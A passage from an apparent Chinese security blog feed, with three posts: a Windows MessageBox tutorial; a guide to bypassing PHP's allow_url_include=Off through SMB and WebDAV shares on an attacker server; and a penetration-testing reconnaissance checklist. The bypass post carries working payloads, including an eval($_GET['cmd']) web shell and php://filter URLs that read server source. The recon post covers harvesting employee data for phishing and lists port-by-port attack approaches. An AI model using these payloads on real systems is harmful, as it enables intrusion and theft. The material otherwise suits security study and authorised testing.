    <content type="html"><![CDATA[<h2 id="从控制台到窗口程序"><a href="#从控制台到窗口程序" class="headerlink" title="从控制台到窗口程序"></a>从控制台到窗口程序</h2><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/1.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/2.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/3.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/4.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/5.png" alt="1"></p><blockquote><p>如果不知道函数什么意思 直接选中函数 然后按F1  可以直接打开文档</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/6.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/7.png" alt="1"></p><blockquote><p>直接按F1  查看参数配置</p></blockquote><blockquote><p>MessageBox  消息框函数：</p></blockquote><blockquote><p>显示一个模式对话框，其中包含一个系统图标、一组按钮和一条特定于应用程序的简短消息，例如状态或错误信息。</p></blockquote><blockquote><p>消息框返回一个整数值，指示用户单击了哪个按钮。</p></blockquote><p><strong>语法：</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">int</span> MessageBox(<br>  <span class="hljs-built_in">HWND</span>    <span class="hljs-built_in">hWnd</span>,<br>  LPCTSTR lpText,<br>  LPCTSTR lpCaption,<br>  UINT    uType<br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>hWnd</li></ul><p>类型：<strong>HWND</strong></p><p>要创建的消息框的所有者窗口的句柄。如果此参数为<strong>NULL</strong>，则消息框没有所有者窗口。</p><ul><li>lpText</li></ul><p>类型：<strong>LPCTSTR</strong></p><p>要显示的消息。如果字符串由多行组成，您可以在每行之间使用回车符和/或换行符分隔各行。</p><ul><li>lpCaption</li></ul><p>类型：<strong>LPCTSTR</strong></p><p>对话框标题。如果此参数为<strong>NULL</strong>，则默认标题为<strong>Error</strong>。</p><ul><li>uType</li></ul><p>类型：<strong>UINT</strong></p><p>对话框的内容和行为。此参数可以是来自以下标志组的标志的组合。</p><p>要指示消息框中显示的按钮，请指定以下值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/8.png" alt="1"></p><p>要在消息框中显示图标，请指定以下值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/9.png" alt="1"></p><p>其他的可以查文档</p><p><strong>返回值：</strong></p><p>类型：<strong>int</strong></p><p>如果一个消息框有一个<strong>取消</strong>按钮，则该函数返回<strong>IDCANCEL</strong>如果或者ESC键被按下或值<strong>取消</strong>按钮被选择。</p><p>如果消息框没有<strong>取消</strong>按钮，则按 ESC 将不起作用 - 除非存在 MB_OK 按钮。</p><p>如果显示 MB_OK 按钮并且用户按下 ESC，则返回值将为<strong>IDOK</strong>。</p><p>如果函数失败，则返回值为零。要获取扩展错误信息，请调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p><p>如果函数成功，则返回值是以下菜单项值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/10.png" alt="1"></p><blockquote><p>但是这样直接执行是会报错的 因为创建项目的时候 选择的是控制台输出</p></blockquote><blockquote><p>所以需要调整</p></blockquote><blockquote><p>先右键点击项目 点属性</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/11.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/12.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/13.png" alt="1"></p><p>将控制台换成窗口</p><p>成功执行</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/14.png" alt="1"></p><blockquote><p>为什么hello word前面要加L   因为  创建项目的时候 默认是使用的WCHAR类型的字符集  不加L的话 使用的就CHAR类型的   不匹配 就会报错</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/15.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/16.png" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Winodws</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php文件包含漏洞（allow_url_include=Off）的绕过方法</title>
    <link href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>分享几个当allow_url_include = Off时的文件包含漏洞的绕过方法。</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/1.png" alt="1"></p><p>假设服务端的php代码（aaa.php）如下图所示：</p><h2 id="第1种：smb协议"><a href="#第1种：smb协议" class="headerlink" title="第1种：smb协议"></a><strong>第1种：smb协议</strong></h2><p>Payload：<a href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm</a></p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/2.png" alt="2"></p><p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器.</p><p>首先在VPS上搭建Samba服务，然后添加一个无需认证即可访问的共享目录，配置信息如下图所示：</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/3.png" alt="3"></p><p>然后在/home/share目录创建abc1238.htm文件，文件内容为：<font color="red"><?php phpinfo();?></font></p><p>最后启动Samba服务，访问<a href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm即可绕过allow_url_include</a> = Off的限制GetShell。</p><h2 id="第2种：WebDAV"><a href="#第2种：WebDAV" class="headerlink" title="第2种：WebDAV"></a><strong>第2种：WebDAV</strong></h2><p>Payload：<a href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo()">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo()</a>;</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/4.png" alt="4"></p><p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器。</p><p>首先在VPS上搭建WebDAV环境，我是基于Ubuntu+Apache httpd搭建的WebDAV环境。</p><p>然后在WebDAV目录下创建code.htm文件，文件内容为：<font color="red"><?php eval($_GET['cmd']);?></font></p><p>最后启动Apache httpd服务器，访问<a href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo();%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo();即可绕过allow_url_include</a> = Off的限制GetShell。</p><h2 id="第3种：php-filter"><a href="#第3种：php-filter" class="headerlink" title="第3种：php://filter/"></a><strong>第3种：php://filter/</strong></h2><p>利用php://filter/不能直接GetShell，但可以读取网站php代码文件，然后进行代码分析。或读取网站配置文件等其他重要文件。</p><p>Payload：</p><p><font color="red"><a href="http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php">http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php</a></font></p><p><font color="red"><a href="http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php</a></font></p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/5.png" alt="5"></p><p>执行上述Payload会将D:/phpStudy/WWW/drupal-7.54/index.php文件以base64编码形式返回。</p><p>这种方法在Linux和Windows服务器都可以。</p><p>附带参考链接：</p><p><a href="https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx">https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html">https://www.cnblogs.com/iamstudy/articles/include_file.html</a></p><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集是渗透最重要的阶段，通过一系列的操作尽可能多的收集到多的目标的各种信息，只有先收集到多的信息之后才有利于后续的渗透。</p><h2 id="信息收集方式"><a href="#信息收集方式" class="headerlink" title="信息收集方式"></a>信息收集方式</h2><h3 id="主动收集："><a href="#主动收集：" class="headerlink" title="主动收集："></a>主动收集：</h3><p>与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息</p><h3 id="被动收集："><a href="#被动收集：" class="headerlink" title="被动收集："></a>被动收集：</h3><p>不与目标主机进行直接交互，通过搜索引擎或者社会工程等方式间接的获取目标主机的信息</p><h2 id="一、收集域名信息"><a href="#一、收集域名信息" class="headerlink" title="一、收集域名信息"></a>一、收集域名信息</h2><p>知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，包括<br>域名 DNS 务器信息和注册人的联系信息等。<br><strong>域名信息收集</strong>的常用方法有以下这几种：</p><h3 id="1-whois查询"><a href="#1-whois查询" class="headerlink" title="1.whois查询"></a>1.whois查询</h3><ul><li>用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</li><li>Whois查询我们主要关注的重点是注册商、注册人、邮件、DNS解析服务器、注册人联系电话。</li><li>whois信息在线收集地址<br>站长之家： <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>阿里云域名信息查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com</a><br>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li>whois反查<br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>whois反查可根据whois获取到的域名所有人、域名注册商、域名注册日期和过期日期等,使用邮箱，电话等进行反查获取更多关联的域名等信息</li></ul><h3 id="2-备案信息查询"><a href="#2-备案信息查询" class="headerlink" title="2.备案信息查询"></a>2.备案信息查询</h3><ul><li>备案查询我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。</li><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>爱站网：<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></li></ul><h3 id="3-企业信息查询"><a href="#3-企业信息查询" class="headerlink" title="3.企业信息查询"></a>3.企业信息查询</h3><ul><li>1.企业基本信息。</li></ul><p>2.员工信息（手机号码、邮箱、姓名等），组织框架、企业法人、企业综合信息等。<br>3.其中员工信息收集是信息收集中的一项重要工作，员工信息包括：员工姓名、员工工号、员工家庭及交际信息、上网习惯等。（社会工程学）<br>4.员工身份信息：员工简历，员工身份证，手机号，生日，家乡，住址等个人信息。5、员工社交账号信息：QQ号，QQ群，微博，微信，支付宝，员工邮箱账号等。</p><ul><li><p>可以通过天眼查等等网站 查找测试目标的身份信息  邮箱等<br>如果查到邮箱之后  <strong>在对方允许的情况下</strong> 就可以进行钓鱼测试<br>可以通过一些HR入手 在各大招聘网收集相关信息</p></li><li><p><em>用到的东西：</em>*</p><ul><li><a href="https://www.tianyancha.com天眼查/">https://www.tianyancha.com天眼查</a><br><a href="https://www.qichacha.com/%E4%BC%81%E6%9F%A5%E6%9F%A5">https://www.qichacha.com/企查查</a><br><a href="https://www.reg007.com/">https://www.reg007.com/</a>  注册过哪些网站<br><a href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a> 在线邮箱查询<br>Maltego 信息收集<br>各种招聘网<br><a href="https://www.aies.cn/pinyin.htm">https://www.aies.cn/pinyin.htm</a> 在线汉字转拼音<br><a href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a> 超级弱口令工具<br><a href="https://anonymousemail.me/">https://anonymousemail.me/</a> 匿名邮箱</li></ul></li><li><p>通过kali里面的Maltego对测试站点的信息收集</p><h3 id="4-JS信息收集"><a href="#4-JS信息收集" class="headerlink" title="4.JS信息收集"></a>4.JS信息收集</h3></li><li><p>通过JS收集，url，目录和参数<br>Js作为我们信息收集里面重要的一个环节很多人会忽略，Js里面可能蕴藏了很多敏感信息，组成字典fuzz效果很好。<br>用到的脚本：<br><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><h2 id="二、子域名收集"><a href="#二、子域名收集" class="headerlink" title="二、子域名收集"></a>二、子域名收集</h2><p>子域名也就是二级域名，是指顶级域名下的域名。收集的子域名越多，我们测试的目标就越多，目标系统渗透成功的机率也越大。主站无懈可击的时候子域名是一个很好的突破口。</p><h3 id="1-工具收集"><a href="#1-工具收集" class="headerlink" title="1.工具收集"></a>1.工具收集</h3><p>layer子域名挖掘机、subDomainsBrute、K8、orangescan、DNSRecon、Sublist3r、dnsmaper、wydomain等等。此类工具github都有下载地址和使用方法。</p></li><li><p>*SubDomainBrute**：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p></li><li><p>*Sublist3r**：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>Layer（5.0增强版）：<a href="https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q">https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q  </a>密码:aup5</p></li></ul><h3 id="2-搜索引擎"><a href="#2-搜索引擎" class="headerlink" title="2.搜索引擎"></a>2.搜索引擎</h3><h4 id="1-google-hack语法"><a href="#1-google-hack语法" class="headerlink" title="1.google hack语法"></a>1.google hack语法</h4><ul><li>  site 指定域名<br>  intext   正文中存在关键字的网页<br>  intitle   标题中存在关键字的网页<br>  info      一些基本信息<br>  inurl    URL存在关键字的网页<br>  filetype 搜索指定文件类型    * 1、​site:baidu.com#收集百度子域名    * 2、intitle:管理登录  #查找后台管理登陆界面    * 3.filetype:php   #查找php类型主页    * 4、inurl:file   #查找url上含file的网址寻找上传漏洞​    * other<pre><code>  site:xx.com filetype:txt 查找TXT文件 其他的以此类推  查找后台  site:xx.com intext:管理  site:xx.com inurl:login  site:xx.com intitle:后台  查看服务器使用的程序  site:xx.com filetype:asp  site:xx.com filetype:php  site:xx.com filetype:jsp  site:xx.com filetype:aspx  查看上传漏洞  site:xx.com inurl:file  site:xx.com inurl:load  查找注射点  site:xx.com filetype:asp</code></pre><h4 id="2-网络组件搜索引擎"><a href="#2-网络组件搜索引擎" class="headerlink" title="2.网络组件搜索引擎"></a>2.网络组件搜索引擎</h4>如shodanhq.com、zoomeye.org、<a href="http://www.fofa.so/">www.fofa.so</a><h4 id="3-第三方聚合应用枚举"><a href="#3-第三方聚合应用枚举" class="headerlink" title="3.第三方聚合应用枚举"></a>3.第三方聚合应用枚举</h4></li><li><em>第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</em>*<br>（1）VirusTotal：<a href="https://www.virustotal.com/#/home/search">https://www.virustotal.com/#/home/search</a><br>（2）DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> <h2 id="三、收集敏感信息"><a href="#三、收集敏感信息" class="headerlink" title="三、收集敏感信息"></a>三、收集敏感信息</h2></li><li>*讲解**：当某些站点无法直接通过技术层面进行渗透时，或者无法通过扫描进行信息收集时。这时候可利用搜索引擎搜索目标站点暴露在互联网上的关联信息。例如：数据库文件、sql注入、服务器配置信息、甚至是通过git找到站点泄露源代码、robots.txt等敏感信息。从而达到渗透测试目的。<h3 id="1-github敏感信息泄露"><a href="#1-github敏感信息泄露" class="headerlink" title="1.github敏感信息泄露"></a>1.github敏感信息泄露</h3>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。<br>详细语法请参考一下链接<br><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a><h3 id="2-通过谷歌语法进行信息收集"><a href="#2-通过谷歌语法进行信息收集" class="headerlink" title="2.通过谷歌语法进行信息收集"></a>2.通过谷歌语法进行信息收集</h3>googlehack是指使用google等搜索引擎对某些特定的网络主机暴露在公网上的信息进行搜索，已达到快速搜集相关敏感信息并进行利用的目的。<h3 id="3-工具主动扫描"><a href="#3-工具主动扫描" class="headerlink" title="3.工具主动扫描"></a>3.工具主动扫描</h3><h4 id="敏感目录文件"><a href="#敏感目录文件" class="headerlink" title="敏感目录文件"></a>敏感目录文件</h4></li><li>*讲解**：在渗透信息收集攻击中，收集敏感目录文件是非常关键的一步，可以帮助攻击者识别网站存在多少个目录，多少个页面，探索出网站的整体结构。还可以发现网站暴露在互联网的敏感文件、后台文件、数据库文件等</li><li>Google语法是万能的<br>DirBuster（kali自带的一款扫描工具）<br>Webdirscan（python编写的简易的扫描工具）<br>御剑（操作简易方便）<br>dirmap（一款高级web目录扫描工具，功能比较强大）<br>7kbstorm <a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a><br>爬虫（AWVS、Burpsuite、北极熊等）</li></ul><p>这些工具都自带字典，也可以自己手动添加，拥有强大的字典也是很关键的</p><h2 id="四、指纹识别"><a href="#四、指纹识别" class="headerlink" title="四、指纹识别"></a>四、指纹识别</h2><p><strong>讲解</strong>：指纹包含网站cms指纹、主机操作系统指纹、web容器指纹等。应用程序一般在html、jss、css等网站文件中包含一些特征码，另外http响应头中往往也会包含一些特征如x-powered-by、cookies等，这些特征码就是指纹信息的重要组成部分。</p><p>在web渗透过程中，对目标网站的指纹识别非常关键，通过工具扫描或者人工测试来识别cms系统是自建还是二次开发，还是直接使用公开的cms程序。通过获取的这些信息来决定后续渗透的思路和策略。指纹识别是黑客攻击环节中一个非常重要的阶段，也是是信息收集中的一个关键环节。<br><strong>方式</strong>：</p><ul><li>1、通过指定特殊目录或者特殊文件<br>  2、底部信息@pwoered by<br>  3、html中注释掉的内容<br>  4、robots.txt文件中的关键字<br>  5、火狐wappalyzer插件<br>  6、whatweb工具<br>  7、潮汐指纹：<a href="http://finger.tidesec.net/">http://finger.tidesec.net</a><br>  8、CMS识别工具 <a href="http://whatweb.bugscaner.com/look">http://whatweb.bugscaner.com/look</a><br>  CMS漏洞利用：确定了cms版本后，这里可以通过百度搜索相应漏洞<h2 id="五、Waf识别"><a href="#五、Waf识别" class="headerlink" title="五、Waf识别"></a>五、Waf识别</h2>Waf也叫Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li><li><em>方式：</em>*</li><li>手工 提交恶意数据</li><li>工具（WAFW00F<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f  </a>、Nmap）</li></ul><p>1.Nmap探测WAF有两种脚本。<br>一种是http-waf-detect。</p><blockquote><p>命令：nmap  -p80,443  –script=http-waf-detect  ip</p></blockquote><pre><code>一种是http-waf-fingerprint。&gt;命令：nmap  -p80,443  --script=http-waf-fingerprint  ip</code></pre><h2 id="六、旁站、C段"><a href="#六、旁站、C段" class="headerlink" title="六、旁站、C段"></a>六、旁站、C段</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C端：是和目标服务器ip处在同一个C段的其它服务器。<br>旁站和C段的查询方式：</p><ul><li>(1）利用Bing.com，语法为：<a href="http://cn.bing.com/search?q=ip:111.111.111.111">http://cn.bing.com/search?q=ip:111.111.111.111</a><br>  （2）站长之家：<a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a><br>  （3）利用Google，语法：site:125.125.125.<br>  （4）利用Nmap，语法：nmap  -p  80,8080  –open  ip/24<br>  （5）K8工具、御剑、北极熊扫描器等<br>  （6）在线：<a href="http://www.webscan.cc/">http://www.webscan.cc/</a> <h2 id="七、真实ip"><a href="#七、真实ip" class="headerlink" title="七、真实ip"></a>七、真实ip</h2><h3 id="是否有CDN"><a href="#是否有CDN" class="headerlink" title="是否有CDN"></a>是否有CDN</h3></li></ul><p>1.确定有无cdn<br>使用全国ping 看看ip是否都是一样的 如果是不一样的就可能是使用了CDN的<br>2.使用 nslookup 进行检测，如果返回域名解析对应多个 IP 地址多半是使用了 CDN<br>3.通过谷歌插件(wapplayzer)查看判断是否有CDN</p><h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><ul><li>同国家IP地址访问查询<br>  子域名查询<br>  邮箱查询<br>  敏感文件(探针或phpinfo.php)<br>  扫描全网<br>  DNS历史记录<br>  黑暗引擎<br>  DDOS</li></ul><p>1.通过子域名判断真实ip 因为子域名一般都是没有CDN的 CDN一般都是流量大的站才有<br>2.用国外地址请求  因为CDN一般都是针对国内的用户 如果是国外的话有可能是没有CDN 的 如果是国内的目标的话<br>3.通过敏感文件查看真实的ip 如phpinfo<br>4.查看DNS记录<br>可能有目标没有挂CDN时的DNS记录<br>5.黑暗引擎</p><ul><li>zoomeye、fofa、shodan<br>  通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：<br>  特有的http头部（如server类型、版本、cookie等信息)、<br>  特定keyword（如title、css、js、url等）、<br>  特定的IP段搜索（如fofa支持C段搜索），<br>  有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。<h2 id="八、端口信息收集"><a href="#八、端口信息收集" class="headerlink" title="八、端口信息收集"></a>八、端口信息收集</h2>通过nmap：<h3 id="Nmap常用扫描参数说明"><a href="#Nmap常用扫描参数说明" class="headerlink" title="Nmap常用扫描参数说明"></a>Nmap常用扫描参数说明</h3><img src="https://img-blog.csdnimg.cn/20210517203036646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDQ4MzU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h3 id="常见的端口信息及渗透方法："><a href="#常见的端口信息及渗透方法：" class="headerlink" title="常见的端口信息及渗透方法："></a>常见的端口信息及渗透方法：</h3><p><strong>端口号</strong>      <strong>端口服务/协议简要说明</strong>       <strong>关于端口可能的一些渗透用途</strong><br>tcp 21    ftp 默认的数据和命令传输端口[可明文亦可加密传输]  允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)<br>tcp 22    ssh[数据ssl加密传输]    可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…<br>tcp 23    telnet[明文传输]    爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获<br>tcp 25    smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]    邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑<br>tcp/udp 53    dns[域名解析]    允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控<br>tcp/udp 69    tftp[简单文件传输协议,无认证]    尝试下载目标及其的各类重要配置文件 tcp 80-89,443,8440-8450,8080-8089    web[各种常用的web服务端口]    各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……<br>tcp 110    [邮局协议,可明文可密文]    可尝试爆破,嗅探 tcp 137,139,445    samba[smb实现windows和linux间文件共享,明文]    可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……<br>tcp 143    imap[可明文可密文]    可尝试爆破 udp 161    snmp[明文]    爆破默认团队字符串,搜集目标内网信息<br>tcp 389    ldap[轻量级目录访问协议]    ldap注入,允许匿名访问,弱口令 tcp 512,513,514    linux rexec    可爆破,rlogin登陆<br>tcp 873    rsync备份服务    匿名访问,文件上传 tcp 1194    openvpn    想办法钓vpn账号,进内网<br>tcp 1352    Lotus domino邮件服务    弱口令,信息泄漏,爆破<br>tcp 1433    mssql数据库    注入,提权,sa弱口令,<br>爆破 tcp 1521    oracle数据库    tns爆破,注入,弹shell…<br>tcp 1500    ispmanager 主机控制面板    弱口令<br>tcp 1025,111,2049    nfs    权限配置不当<br>tcp 1723    pptp    爆破,想办法钓vpn账号,进内网<br>tcp 2082,2083    cpanel主机管理面板登录    弱口令<br>tcp 2181    zookeeper    未授权访问<br>tcp 2601,2604    zebra路由    默认密码zerbra<br>tcp 3128    squid代理服务    弱口令<br>tcp 3312,3311    kangle主机管理登录    弱口令<br>tcp 3306    mysql数据库    注入,提权,爆破<br>tcp 3389    windows rdp远程桌面    shift后门,爆破,ms12-020[蓝屏exp]<br>tcp 4848    glassfish控制台    弱口令<br>tcp 4899    radmin远程桌面管理工具, 抓密码拓展机器<br>tcp 5000    sybase/DB2数据库    爆破,注入<br>tcp 5432    postgresql数据库    爆破,注入,弱口令<br>tcp 5632    pcanywhere远程桌面管理工具    抓密码,代码执行<br>tcp 5900,5901,5902    vnc远程桌面管理工具    弱口令爆破,如果信息搜集不到位,成功几率很小<br>tcp 5984    CouchDB    未授权导致的任意指令执行<br>tcp 6379    redis未授权    可尝试未授权访问,弱口令爆破<br>tcp 7001,7002    weblogic控制台    java反序列化,弱口令<br>tcp 7778    kloxo    主机面板登录<br>tcp 8000    Ajenti主机控制面板    弱口令<br>tcp 8443    plesk主机控制面板    弱口令<br>tcp 8069    zabbix    远程执行,sql注入<br>tcp 8080-8089    Jenkins,jboss    反序列化,控制台弱口令<br>tcp 9080-9081,9090    websphere控制台    java反序列化/弱口令<br>tcp 9200,9300    elasticsearch    远程执行<br>tcp 10000    webmin linux主机web控制面板入口    弱口令<br>tcp 11211    memcached    未授权访问<br>tcp 27017,27018    mongodb    爆破,未授权访问<br>tcp 3690    svn服务    svn泄露,未授权访问<br>tcp 50000    SAP Management Console    远程执行<br>tcp 50070,50030    hadoop    默认端口未授权访问</p><h3 id="Nmap脚本分类"><a href="#Nmap脚本分类" class="headerlink" title="Nmap脚本分类"></a>Nmap脚本分类</h3><p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>brute: 